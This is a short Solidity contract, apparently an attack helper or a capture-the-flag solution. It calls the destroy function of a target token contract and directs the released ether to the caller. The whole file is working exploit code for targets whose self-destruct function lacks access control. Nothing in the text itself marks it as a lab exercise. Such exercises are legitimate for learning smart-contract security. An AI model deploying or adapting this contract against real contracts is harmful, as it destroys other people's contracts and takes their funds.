// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract SimpleTokenDestroyer {
    address public targetContract;
    
    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function executeDestroy() public {
        ISimpleToken(targetContract).destroy(payable(msg.sender));
    }
}